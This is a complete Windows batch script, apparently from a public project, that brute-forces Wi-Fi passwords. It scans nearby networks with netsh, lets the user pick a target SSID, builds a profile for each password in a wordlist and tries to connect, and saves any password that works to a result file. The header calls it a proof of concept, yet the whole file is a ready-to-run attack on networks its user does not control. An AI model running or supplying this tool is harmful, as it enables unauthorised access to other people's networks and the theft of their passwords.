@echo off
:: Batch Wi-Fi Brute Forcer - Developed By TechnicalUserX
:: Please refer to https://github.com/TechnicalUserX for more projects

:: This program is created to be a proof of concept that it is possible
:: to write a working Wi-Fi attack tool with Batchfiles since there 
:: are countless examples on the internet that claims to be legit
:: hacking tools, working on CMD. While this tool does not claim
:: a 100% success ratio, it still works if the target Wi-Fi has
:: weak password. :)

:: There is already a wordlist file in the repository but you are free
:: to use your own wordlists.

cls
setlocal enabledelayedexpansion
title Batch Wi-Fi Brute Forcer
color 0f
:: Enable UTF-8
chcp 65001>nul
cd /D %~dp0

if not exist importwifi.xml (
    echo.
    call :color_echo . red "importwifi.xml is missing. Exiting..."
    timeout /t 3 >nul
    exit
)


:: Interface Variables
set interface_number=0
set interface_mac=not_defined
set interface_id=not_defined
set interface_state=not_defined
set interface_description=not_defined

set wifi_target=not_defined

set wordlist_file=not_defined

for /f "tokens=1" %%a in ( DefaultWordlist.txt ) do (
   set wordlist_file=%%a
)

if "!wordlist_file!" neq "not_defined" (
  if not exist !wordlist_file! (
     call :wordlist
   )
)

:program_entry
    call :interface_init
    call :mainmenu
goto :eof


:interface_detection
    cls
    echo.
    call :color_echo . yellow "Detecting interfaces..."
    set interface_temp_index=-1
    set interface_number=0

    for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L "Name Description Physical"') do (
        if "%%c"=="Wi-Fi" (
            set /a interface_temp_index=!interface_temp_index!+1
            if "%%d"=="" (
                set interface[!interface_temp_index!]_id=%%c
            ) else (
                set interface[!interface_temp_index!]_id=%%c %%d
            )
        )
        if %%a==Description (
            set interface[!interface_temp_index!]_description=%%c %%d
        )
        if %%a==Physical (
            set interface[!interface_temp_index!]_mac=%%d
        )	


    )

    set /a interface_number=!interface_temp_index!+1
    timeout /t 2 >nul
    cls
goto :eof


:color_echo 

    :: Check if the first 2 arguments are empty, cause they are needed for background/foreground information
    :: The 3rd argument is not that important because it can be an empty string
    if "%~1" equ "" (
        goto :eof
    )
    if "%~2" equ "" (
        goto :eof
    )

    :: Background color; if invalid, no action
    if "%~1" equ "black" (
        <nul set /p=[40m
    )

    if "%~1" equ "red" (
        <nul set /p=[41m
    )

    if "%~1" equ "green" (
        <nul set /p=[42m
    )

    if "%~1" equ "yellow" (
        <nul set /p=[43m
    )

    if "%~1" equ "blue" (
        <nul set /p=[44m
    )

    if "%~1" equ "magenta" (
        <nul set /p=[45m
    )

    if "%~1" equ "cyan" (
        <nul set /p=[46m
    )

    if "%~1" equ "white" (
        <nul set /p=[47m
    )

    :: Foreground color; if invalid, no action

    if "%~2" equ "black" (
        <nul set /p=[30m
    )

    if "%~2" equ "red" (
        <nul set /p=[31m
    )

    if "%~2" equ "green" (
        <nul set /p=[32m
    )

    if "%~2" equ "yellow" (
        <nul set /p=[33m
    )

    if "%~2" equ "blue" (
        <nul set /p=[34m
    )

    if "%~2" equ "magenta" (
        <nul set /p=[35m
    )

    if "%~2" equ "cyan" (
        <nul set /p=[36m
    )

    if "%~2" equ "white" (
        <nul set /p=[37m
    )

    <nul set /p="%~3"

    <nul set /p=[0m
goto :eof


:interface_init
    cls
    :: Interface detection and selection
    call :interface_detection
    echo.
    call :color_echo . cyan " Interface Init"
    echo.
    echo.
	if !interface_number! equ 1 (

        call :color_echo . yellow " Only '1' Interface Found!"
        echo.
        echo.
        call :color_echo . white " !interface[0]_description!("
        call :color_echo . blue "!interface[0]_mac!"
        call :color_echo . white ")"
        echo.
        echo.
        echo Making !interface[0]_description! the default interface...
        set interface_id=!interface[0]_id!
        set interface_description=!interface[0]_description!
        set interface_mac=!interface[0]_mac!
        timeout /t 3 >nul
	)
	
	if !interface_number! gtr 1 (

        call :color_echo . yellow " Multiple '!interface_number!' Interfaces Found!"
        echo.
        timeout /t 3 >nul
        call :interface_selection
        
	)
	
	if !interface_number!==0 (

        call :color_echo . yellow "WARNING"
        echo.
        echo No interfaces found on this device^^!
        echo.
        set interface_id=not_defined
        set interface_description=not_defined
        set interface_mac=not_defined
        pause
        cls
	)

goto :eof


:interface_selection
    cls
    echo.
    call :color_echo . cyan "Interface Selection"
    echo.
    echo.
    set wifi_target=not_defined
    set /a interface_number_zero_indexed=!interface_number!-1
    set /a cancel_index=!interface_number_zero_indexed!+1

    for /l %%a in ( 0, 1, !interface_number_zero_indexed! ) do (
        call :color_echo . magenta "%%a) "
        call :color_echo . white " !interface[%%a]_description!("
        call :color_echo . blue "!interface[%%a]_mac!"
        call :color_echo . white ")"
        echo.
    )
    call :color_echo
    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt

    if !program_prompt_input! leq !interface_number_zero_indexed! (
        if !program_prompt_input! geq 0 (

        echo Making !interface[!program_prompt_input!]_description! the interface...
        set interface_id=!interface[%program_prompt_input%]_id!
        set interface_description=!interface[%program_prompt_input%]_description!
        set interface_mac=!interface[%program_prompt_input%]_mac!
        ) else (
            if "!program_prompt_input!" equ "!cancel_index!" (
                set interface_id=not_defined
                set interface_description=not_defined
                set interface_mac=not_defined
                goto :eof
            ) else (
                call :program_prompt_invalid_input
                goto :interface_selection
            )
        )
    ) else (

        if !program_prompt_input! equ !cancel_index! (
            set interface_id=not_defined
            set interface_description=not_defined
            set interface_mac=not_defined
            goto :eof
        ) else (
            call :program_prompt_invalid_input
            goto :interface_selection
        )


    )


goto :eof


:program_prompt
    call :color_echo . green " bruteforcer"
    call :color_echo . white "$ "
    set /p program_prompt_input=
goto :eof


:program_prompt_invalid_input
    call :color_echo . red "Invalid input"
    timeout /t 3 >nul
goto :eof


:mainmenu
    cls
    echo.
    call :color_echo . cyan "Batch Wi-Fi Brute Forcer"
    echo.
    echo.
    call :color_echo . magenta "   Interface : "
    call :color_echo . white "!interface_description!("
    call :color_echo . blue "!interface_mac!"
    call :color_echo . white ") "
    echo.
    call :color_echo . magenta "   Target    : "
    call :color_echo . white "!wifi_target!"
    echo.
    call :color_echo . magenta "   Wordlist  : "
    call :color_echo . white "!wordlist_file!"
    echo.
    echo.
    call :program_prompt
    echo.

    if "!program_prompt_input!" equ "scan" (
        call :scan
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "interface" (
        call :interface_init
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "attack" (
        call :attack
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "help" (
        call :help
        goto :mainmenu
    )


    if "!program_prompt_input!" equ "wordlist" (
        call :wordlist
        goto :mainmenu
    )

    if "!program_prompt_input!" equ "exit" (
        exit
    )

call :program_prompt_invalid_input
goto :mainmenu


:scan
    cls

    if "!interface_id!" equ "not_defined" (
        call :color_echo . red "You have to select an interface to perform a scan"
        set wifi_target=not_defined
        echo.
        echo.
        pause
        goto :eof
    )


    echo.
    call :color_echo . cyan "Possible Wi-Fi Networks"
    echo.
    echo.
    :: wifi[] is the array for possible wifis
    set wifi_index=-1
    set cancel_index=0
    for /f "tokens=1-4" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (

        if "%%a" equ "SSID" (
            set /a wifi_index=!wifi_index!+1
            set wifi[!wifi_index!]_ssid=%%d
        )

        if "%%a" equ "Signal" (
            set wifi[!wifi_index!]_signal=%%c
        )

    )
    set /a cancel_index=!wifi_index!+1
    
    for /l %%a in ( 0, 1, !wifi_index! ) do (

        call :color_echo . magenta "%%a) "

        if "!wifi[%%a]_ssid!" equ "" (
            call :color_echo . red "No Name "
        ) else (
            call :color_echo . white "!wifi[%%a]_ssid! "
        )


        call :color_echo . blue "!wifi[%%a]_signal!"
        echo.
    )


    call :color_echo . red "!cancel_index!) Cancel"
    echo.
    echo.

    call :program_prompt
    echo.

    if "!program_prompt_input!" equ "!cancel_index!" (
        goto :eof
    )
    if !program_prompt_input! leq !wifi_index! (
            if !program_prompt_input! geq 0 (
            set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
            goto :eof
        )
    )

    call :program_prompt_invalid_input

goto :eof


:attack

    if "!wordlist_file!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please provide a wordlist..."
        echo.
        echo.
        pause
        goto :eof
    )


    if "!wifi_target!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select a target after scanning..."
        echo.
        echo.
        pause
        goto :eof
    )

    if "!interface_id!" equ "not_defined" (
        cls
        echo.
        call :color_echo . red "Please select an interface..."
        echo.
        echo.
        pause
        goto :eof
    )

    cls
    echo.
    call :color_echo . yellow "WARNING"
    echo.
    echo.
    echo If you connected to a network with the same name as this: "!wifi_target!",
    echo its profile will be deleted.
    echo.
    echo This app might not find the correct password if the signal strength
    echo is too low. Remember, this is an online attack. Expect slow attempts.
    echo.
    pause
    netsh wlan delete profile !wifi_target! interface="!interface_id!">nul
    cls

    :: Prepare ssid import
    del /Q /F importwifi_prepared.xml 2>nul
    for /f "tokens=*" %%a in ( importwifi.xml ) do (
        set variable=%%a
        echo !variable:changethistitle=%wifi_target%!>>importwifi_prepared.xml
    )
    set password_count=0
    for /f "tokens=1" %%a in ( !wordlist_file! ) do (
        set /a password_count=!password_count!+1
        set password=%%a
		set temp_auth_num=0
        call :prepare_attempt "!password!"
        netsh wlan add profile filename=importwifi_attempt.xml >nul
        cls
        echo.
        call :color_echo . cyan "Attacking"
        echo.
        echo.
        call :color_echo . magenta "Target Wi-Fi   : "
        call :color_echo . white "!wifi_target!"
        echo.
        call :color_echo . magenta "Password Count : "
        call :color_echo . white "!password_count!"
        echo.
        echo.
        call :color_echo . blue "Trying password -> "
        call :color_echo . yellow "!password!"
        echo.
        echo.
        call :color_echo . cyan "Attempts: "
        echo.
		netsh wlan connect name=!wifi_target! interface="!interface_id!" >nul



        for /l %%a in ( 1, 1, 20 ) do (
            call :interface_find_state

            if "!interface_state!" equ "connecting" (
                goto :attack_success
            )

            if "!interface_state!" equ "connected" (
                goto :attack_success
            )
            

        )

        del /Q /F importwifi_attempt.xml 2>nul
    )

    :attack_failure
        del /Q /F importwifi_prepared.xml 2>nul
        del /Q /F importwifi_attempt.xml 2>nul
        cls
        echo.
        call :color_echo . red "Could not find the password"
        echo.
        echo.
        netsh wlan delete profile !wifi_target! interface="!interface_id!">nul
        pause
    goto :eof

    :attack_success
        del /Q /F importwifi_prepared.xml 2>nul
        del /Q /F importwifi_attempt.xml 2>nul
        cls
        echo.
        call :color_echo . green "Found the password"
        echo.
        echo.
        echo.
        call :color_echo . magenta "Target     : "
        call :color_echo . white "!wifi_target!"
        echo.
        call :color_echo . magenta "Password   : "
        call :color_echo . white "!password!"
        echo.
        call :color_echo . magenta "At attempt : "
        call :color_echo . white "!password_count!"
        echo.
        echo.

        echo Batch Wi-Fi Brute Forcer Result>>result.txt
        echo Target     : !wifi_target!>>result.txt
        echo At attempt : !password_count!>>result.txt
        echo Password   : !password!>>result.txt
        echo.>>result.txt
        pause
    goto :eof

goto :eof




:help
		cls
		echo.
		call :color_echo . cyan "Commands"
		echo.
		echo.
		echo  - help             : Displays this page
                echo  - wordlist         : Provide a wordlist file
		echo  - scan             : Performs a WI-FI scan
		echo  - interface        : Open Interface Management
		echo  - attack           : Attacks selected WI-FI
		echo.
		echo  For more informaton, please read "README.md".
		echo.
		echo  Other projects of TUX:
		echo  https://www.technicaluserx.wordpress.com
        echo  https://github.com/TechnicalUserX
		echo.
		echo.
		echo Press any key to continue...
		pause >nul

goto :eof



:wordlist
    cls
    echo.
    call :color_echo . cyan "Wordlist"
    echo.
    echo.
    echo Please provide a valid wordlist
    echo.
    call :program_prompt
    echo.
    if not exist !program_prompt_input! (
        call :color_echo . red "Provided path does not resolve to a file"
        timeout /t 2 >nul
    ) else (
        set wordlist_file=!program_prompt_input!
        goto :eof
    )
goto :eof



:prepare_attempt
	for /f "tokens=*" %%x in ( importwifi_prepared.xml ) do (
		set code=%%x
		echo !code:changethiskey=%~1!>>importwifi_attempt.xml
    )
goto :eof



:interface_find_state
    set interface_state_check=false

        for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do ( 
        
        if !interface_state_check!==true (
            set interface_state=%%c
            goto :skip_find_connection_state
        )
        
        if "!interface_id!"=="%%c" (
            set interface_state_check=true
        )
        
        if "!interface_id!"=="%%c %%d" (
            set interface_state_check=true
        )
    )
	:skip_find_connection_state
    if !interface_state!==associating (
        call :color_echo . yellow "Associating..."
        echo.
    )
    if !interface_state!==disconnecting (
        call :color_echo . red "Disconnecting..."
        echo.
    )
    if !interface_state!==disconnected (
        call :color_echo . red "Disconnected."
        echo.
    )
    if !interface_state!==authenticating (
        call :color_echo . blue "Authenticating..."
        echo.
    )
    if !interface_state!==connecting (
        call :color_echo . yellow "Connecting..."
        echo.
    )
    if !interface_state!==connected (
        call :color_echo . green "Connected."
        echo.
        timeout /t 2 /nobreak>nul
    )




goto :eof
